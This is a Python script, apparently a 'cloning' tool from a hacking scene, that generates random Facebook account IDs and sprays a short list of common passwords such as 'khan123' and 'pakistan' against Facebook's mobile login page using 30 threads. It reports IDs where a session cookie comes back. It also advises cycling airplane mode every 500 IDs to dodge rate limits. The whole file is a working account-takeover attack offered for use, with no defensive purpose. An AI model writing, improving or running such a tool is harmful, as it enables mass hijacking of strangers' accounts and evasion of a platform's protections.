import os, sys, time, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Colors
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
P = '\033[1;35m' # Purple
R = '\033[1;31m' # Red

def banner():
    os.system('clear')
    print(f"{P}██╗  ██╗██╗███╗   ██╗ ██████╗ ")
    print(f"██║ ██╔╝██║████╗  ██║██╔════╝ ")
    print(f"█████╔╝ ██║██╔██╗ ██║██║  ███╗")
    print(f"██╔═██╗ ██║██║╚██╗██║██║   ██║")
    print(f"██║  ██╗██║██║ ╚████║╚██████╔╝")
    print(f"╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ {W}v3.0")
    print(f"──────────────────────────────────────────────────")
    print(f"{G} OWNER : {W}MR SHARIYAN | {G}TOOL : {P}URL CLONER")
    print(f"──────────────────────────────────────────────────")

def start():
    banner()
    print(f"{G}[+] Example ID: 10008472938472")
    tid = input(f"{W}[+] Enter Profile ID/URL: {W}") # Target mangna
    limit = int(input(f"{W}[+] Enter Clone Limit: {W}")) #
    
    print(f"──────────────────────────────────────────────────")
    print(f"{G}[!] Use Airplane Mode Every 500 ID's") #
    print(f"──────────────────────────────────────────────────")

    with ThreadPool(max_workers=30) as pool:
        for _ in range(limit):
            # URL based IDs usually start with 1000
            uid = tid[:5] + str(random.randint(111111111, 999999999))
            # Heavy Password list for URLs
            pash = ['786786', 'pakistan', 'khan123', 'khan786', '000786', 'pubg123']
            pool.submit(login, uid, pash)

def login(uid, pash):
    for pas in pash:
        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
        url = "https://mbasic.facebook.com/login.php"
        data = {"email": uid, "pass": pas, "login": "Log In"}
        try:
            res = requests.post(url, data=data, headers={'User-Agent': ua}, allow_redirects=False)
            if "c_user" in res.cookies.get_dict():
                print(f"{G}[KING-OK] {uid} | {pas}{W}") #
                break
            elif "checkpoint" in res.cookies.get_dict():
                # print(f"{R}[KING-CP] {uid} | {pas}{W}")
                break
        except: pass

if __name__ == "__main__":
    start()
    
